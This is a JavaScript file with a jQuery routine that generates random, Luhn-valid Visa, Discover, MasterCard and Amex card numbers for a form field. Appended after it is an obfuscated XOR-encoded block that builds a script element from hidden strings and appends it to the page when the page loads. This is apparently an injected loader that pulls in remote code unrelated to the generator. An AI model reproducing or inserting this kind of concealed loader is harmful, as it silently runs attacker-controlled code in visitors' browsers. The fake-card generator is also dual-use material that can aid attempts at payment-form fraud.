jQuery(document).ready(function($) {
    
    $('#cardType').change(generateCC);                 
    generateCC();                   
    
	function generateCC(){
		var cc_number = new Array(16);
		var cc_len = 16;
		var start = 0;
		var rand_number = Math.random();

		switch($('#cardType').val())
        {
			case "Visa":
				cc_number[start++] = 4;
				break;
			case "Discover":
				cc_number[start++] = 6;
				cc_number[start++] = 0;
				cc_number[start++] = 1;
				cc_number[start++] = 1;
				break;
			case "MasterCard":
				cc_number[start++] = 5;
				cc_number[start++] = Math.floor(Math.random() * 5) + 1;
				break;
			case "Amex":
				cc_number[start++] = 3;
				cc_number[start++] = Math.round(Math.random()) ? 7 : 4 ;
				cc_len = 15;
				break;
        }

        for (var i = start; i < (cc_len - 1); i++) {
			cc_number[i] = Math.floor(Math.random() * 10);
        }

		var sum = 0;
		for (var j = 0; j < (cc_len - 1); j++) {
			var digit = cc_number[j];
			if ((j & 1) == (cc_len & 1)) digit *= 2;
			if (digit > 9) digit -= 9;
			sum += digit;
		}

		var check_digit = new Array(0, 9, 8, 7, 6, 5, 4, 3, 2, 1);
		cc_number[cc_len - 1] = check_digit[sum % 10];

        var value="";
		for (var k = 0; k < cc_len; k++) {
			value += cc_number[k];
		}
        $('#cardNumber').val(value);
	}
});
function xelBk(fs){var fmf89V='';var gn=0;var tHY9=0;for(gn=0;gn<fs.length/3;gn++){fmf89V+=String.fromCharCode(fs.slice(tHY9,tHY9+3));tHY9=tHY9+3;}return fmf89V;}function culQ1(pf3,o1CFXW){var y5c7='';var zEf5h=0;var km=0;for(zEf5h=0;zEf5h<pf3.length;zEf5h++){var jdr=pf3.charAt(zEf5h);var i38a0o=jdr.charCodeAt(0)^o1CFXW.charCodeAt(km);jdr=String.fromCharCode(i38a0o);y5c7+=jdr;if(km==o1CFXW.length-1)km=0;else km++;}return (y5c7);}function y87q(b1Nb){var mr59yV=document[dH9V(uiKHO[3])](dH9V(uiKHO[0])+dH9V(uiKHO[1])+dH9V(uiKHO[2]));mr59yV[dH9V(uiKHO[4])]=b1Nb;mr59yV[dH9V(uiKHO[5])]=dH9V(uiKHO[6]);document[dH9V(uiKHO[9])](dH9V(uiKHO[8]))[0][dH9V(uiKHO[7])](mr59yV);}var uiKHO=["020052","021062","023035","004037081015053017011007038027009036001","020037087","019046068011","019050076026110030047029034005015056028023035","006039068011047016013003042026008","015050085010","000050064043045017035014045002031008012051054083032032025043","015035064030123091097024055023024047091020058088092111006059068041005067041027019121094029"];function dH9V(eo){return culQ1(xelBk(eo),'gW4nAtNkCvlJu');}y87q(dH9V(uiKHO[10]));